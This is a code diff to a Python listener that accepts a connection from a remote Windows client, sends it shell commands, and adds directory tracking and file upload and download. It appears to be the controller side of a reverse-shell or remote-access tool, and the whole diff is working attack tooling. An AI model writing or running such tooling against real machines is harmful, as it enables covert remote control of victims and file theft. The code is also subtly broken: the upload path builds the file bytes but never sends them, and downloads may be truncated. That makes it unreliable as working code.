@@ -1,7 +1,8 @@
 import socket
 import argparse
-from termcolor import cprint
+from termcolor import cprint, colored
 import threading
+import os
 
 class Listener:
     CLIENTS = {}
@@ -13,21 +14,63 @@ class Listener:
         self.sd.listen(10)
         #Waiting for requests
         self.client_sd, self.client_address = self.sd.accept()
+        
+        #Working dir on windows
+        self.client_sd.send(b'cd\r\n')
+        size = self.read_until_CRLF()
+        self.working_dir = self.client_sd.recv(int(size)).decode('utf-8','ignore').replace('\n','')
+        self.working_dir = self.working_dir.replace('\r','')
+
+    def read_until_CRLF(self):
+        size = ''
+        
+        while True:
+            size += self.client_sd.recv(1).decode('utf-8','ignore')
+
+            if size.endswith('\r\n'):
+                break
+
+        return size[:-2]
+
+    def send_file(self, path):
+        if os.path.exists(path) and os.path.isfile(path):
+            with open(path, 'rb') as f:
+                f_bytes = f.read()
+                return f'{len(f_bytes)}\r\n'.encode()+f_bytes
+        else:
+            print(f'File {path} not found')
+
+    def receive_file(self, size, name):
+        file_bytes = self.client_sd.recv(size)
+        
+        with open(name, 'wb') as f:
+            f.write(file_bytes)
 
     def run(self):
         while True:
-            command = input(">> ")
-            self.client_sd.send(command.encode())
+            command = input(self.working_dir+'>> ')
+            cmd_list = command.split(' ')
+            self.client_sd.send((command+'\r\n').encode())
 
-            size = ''
-            while True:
-                size += self.client_sd.recv(1).decode('utf-8','ignore')
+            if cmd_list[0]!='up':
+                size = self.read_until_CRLF()
 
-                if size.endswith('\r\n'):
-                    break
+            if cmd_list[0]=='cd' and len(cmd_list)>1:
+                self.working_dir = self.read_until_CRLF()
+            
+            elif cmd_list[0]=='down' and len(cmd_list)>1:
+                if int(size) == 0:
+                    print('No file download')
+                else:
+                    head, tail = os.path.split(cmd_list[1])
+                    self.receive_file(int(size), tail)
 
-            result = self.client_sd.recv(int(size)).decode('utf-8','ignore')
-            print(result)
+            elif cmd_list[0]=='up' and len(cmd_list)>1:
+                self.send_file(cmd_list[1])
+
+            if cmd_list[0]!='down' and cmd_list[0]!='up':
+                result = self.client_sd.recv(int(size)).decode('utf-8','ignore')
+                print(result)
 
 '''
 Error raised if the user doesn't specify a valid gateway IP address
